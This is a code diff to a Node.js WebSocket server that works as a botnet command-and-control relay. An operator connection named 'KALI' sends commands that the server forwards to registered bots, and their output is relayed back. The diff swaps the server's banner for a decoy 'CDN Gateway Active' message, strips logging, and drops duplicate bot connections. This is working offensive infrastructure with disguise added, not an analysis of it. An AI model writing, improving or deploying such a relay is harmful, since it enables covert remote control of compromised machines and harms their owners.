@@ -1,7 +1,7 @@
 const WebSocket = require('ws');
 const http = require('http');
 
-const server = http.createServer((_, r) => r.end('Shadow Tunnel Gateway Active'));
+const server = http.createServer((_, r) => r.end('CDN Gateway Active'));
 const wss = new WebSocket.Server({ server });
 
 let KALI = null;
@@ -13,44 +13,35 @@ wss.on('connection', (ws, req) => {
 
     if (id === 'KALI') {
         KALI = ws;
-        console.log('[+] Kali Conectado');
-        // Sincroniza bots existentes
         BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
     } else {
+        // MÁGICA ANTI-DUPLICATA: Se o bot já existe, fecha a conexão velha
+        if (BOTS.has(id)) {
+            BOTS.get(id).terminate();
+            BOTS.delete(id);
+        }
         BOTS.set(id, ws);
-        console.log(`[+] Bot ${id} Online`);
-        if (KALI?.readyState === WebSocket.OPEN)
-            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
+        if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
     }
 
     ws.on('message', (raw) => {
         if (ws === KALI) {
             try {
-                const { to, cmd } = JSON.parse(raw);
-                const target = BOTS.get(to);
-                if (target?.readyState === WebSocket.OPEN) target.send(cmd);
+                const data = JSON.parse(raw);
+                const target = BOTS.get(data.to);
+                if (target?.readyState === WebSocket.OPEN) target.send(data.cmd);
             } catch (e) {}
         } else {
-            if (KALI?.readyState === WebSocket.OPEN)
-                KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
+            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
         }
     });
 
     ws.on('close', () => {
-        if (ws === KALI) {
-            KALI = null;
-            console.log('[-] Kali Desconectado');
-        } else {
+        if (ws === KALI) KALI = null;
+        else if (BOTS.get(id) === ws) {
             BOTS.delete(id);
-            if (KALI?.readyState === WebSocket.OPEN)
-                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id }));
+            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'off', id }));
         }
     });
-
-    const ping = setInterval(() => {
-        if (ws.readyState === WebSocket.OPEN) ws.ping();
-        else clearInterval(ping);
-    }, 25000);
 });
-
 server.listen(process.env.PORT || 10000);
